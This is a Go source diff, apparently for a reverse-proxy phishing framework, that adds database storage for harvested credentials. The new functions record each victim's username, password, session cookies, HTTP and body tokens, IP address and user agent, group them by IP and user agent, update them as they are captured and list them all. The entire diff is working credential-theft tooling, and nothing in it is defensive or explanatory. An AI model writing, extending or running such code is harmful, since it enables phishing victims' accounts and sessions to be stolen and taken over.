@@ -223,3 +223,177 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 	}
 	return s, nil
 }
+
+// IP+UA-based credential capture storage (new system)
+
+const CredentialTable = "credentials"
+
+type Credential struct {
+	Id           int                                `json:"id"`
+	Phishlet     string                             `json:"phishlet"`
+	LandingURL   string                             `json:"landing_url"`
+	Username     string                             `json:"username"`
+	Password     string                             `json:"password"`
+	Custom       map[string]string                  `json:"custom"`
+	BodyTokens   map[string]string                  `json:"body_tokens"`
+	HttpTokens   map[string]string                  `json:"http_tokens"`
+	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
+	IPUserAgent  string                             `json:"ip_user_agent"`
+	UserAgent    string                             `json:"useragent"`
+	RemoteAddr   string                             `json:"remote_addr"`
+	LogIndex     int                                `json:"log_index"`
+	CreateTime   int64                              `json:"create_time"`
+	UpdateTime   int64                              `json:"update_time"`
+}
+
+func (d *Database) credentialsInit() {
+	d.db.CreateIndex("credentials_ipua", CredentialTable+":*", buntdb.IndexJSON("ip_user_agent"))
+}
+
+func (d *Database) GetOrCreateCredential(ipUA string, phishlet string, landing_url string, useragent string, remote_addr string, logIndex int) (*Credential, error) {
+	// Try to find existing credential first
+	cred, err := d.credentialsGetByIPUA(ipUA)
+	if err == nil {
+		return cred, nil
+	}
+
+	// Create new credential if not found
+	id, _ := d.getNextId(CredentialTable)
+
+	c := &Credential{
+		Id:           id,
+		Phishlet:     phishlet,
+		LandingURL:   landing_url,
+		Username:     "",
+		Password:     "",
+		Custom:       make(map[string]string),
+		BodyTokens:   make(map[string]string),
+		HttpTokens:   make(map[string]string),
+		CookieTokens: make(map[string]map[string]*CookieToken),
+		IPUserAgent:  ipUA,
+		UserAgent:    useragent,
+		RemoteAddr:   remote_addr,
+		LogIndex:     logIndex,
+		CreateTime:   time.Now().UTC().Unix(),
+		UpdateTime:   time.Now().UTC().Unix(),
+	}
+
+	jf, _ := json.Marshal(c)
+
+	err = d.db.Update(func(tx *buntdb.Tx) error {
+		tx.Set(d.genIndex(CredentialTable, id), string(jf), nil)
+		return nil
+	})
+	if err != nil {
+		return nil, err
+	}
+	return c, nil
+}
+
+func (d *Database) SetCredentialUsername(ipUA string, username string) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.Username = username
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) SetCredentialPassword(ipUA string, password string) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.Password = password
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) SetCredentialCustom(ipUA string, name string, value string) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.Custom[name] = value
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) SetCredentialBodyTokens(ipUA string, tokens map[string]string) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.BodyTokens = tokens
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) SetCredentialHttpTokens(ipUA string, tokens map[string]string) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.HttpTokens = tokens
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) SetCredentialCookieTokens(ipUA string, tokens map[string]map[string]*CookieToken) error {
+	c, err := d.credentialsGetByIPUA(ipUA)
+	if err != nil {
+		return err
+	}
+	c.CookieTokens = tokens
+	c.UpdateTime = time.Now().UTC().Unix()
+	return d.credentialsUpdate(c.Id, c)
+}
+
+func (d *Database) credentialsUpdate(id int, c *Credential) error {
+	jf, _ := json.Marshal(c)
+
+	err := d.db.Update(func(tx *buntdb.Tx) error {
+		tx.Set(d.genIndex(CredentialTable, id), string(jf), nil)
+		return nil
+	})
+	return err
+}
+
+func (d *Database) credentialsGetByIPUA(ipUA string) (*Credential, error) {
+	c := &Credential{}
+	err := d.db.View(func(tx *buntdb.Tx) error {
+		found := false
+		err := tx.AscendEqual("credentials_ipua", d.getPivot(map[string]string{"ip_user_agent": ipUA}), func(key, val string) bool {
+			json.Unmarshal([]byte(val), c)
+			found = true
+			return false
+		})
+		if !found {
+			return fmt.Errorf("credential not found: %s", ipUA)
+		}
+		return err
+	})
+	if err != nil {
+		return nil, err
+	}
+	return c, nil
+}
+
+func (d *Database) ListCredentials() ([]*Credential, error) {
+	credentials := []*Credential{}
+	err := d.db.View(func(tx *buntdb.Tx) error {
+		tx.Ascend("credentials_ipua", func(key, val string) bool {
+			c := &Credential{}
+			if err := json.Unmarshal([]byte(val), c); err == nil {
+				credentials = append(credentials, c)
+			}
+			return true
+		})
+		return nil
+	})
+	if err != nil {
+		return nil, err
+	}
+	return credentials, nil
+}
